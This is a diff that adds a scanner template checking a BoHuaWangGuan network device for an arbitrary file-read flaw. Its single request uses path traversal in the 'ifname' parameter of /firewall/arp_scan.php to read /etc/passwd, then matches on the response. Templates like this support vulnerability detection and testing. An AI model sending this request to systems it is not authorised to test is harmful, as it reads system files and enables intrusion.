@@ -1,0 +1,27 @@
+id: BoHuaWangGuan-arp_scan-ReadAnyFile
+
+info:
+  name: BoHuaWangGuan-arp_scan-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: BoHuaWangGuan-arp_scan-ReadAnyFile
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /firewall/arp_scan.php?ifname=/../../../../../etc/passwd HTTP/1.1
+        Host: {{Host}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "sshd"
+          - "sbin"
+        condition: and
+        part: body
+
+      - type: status
+        status:
+          - 200
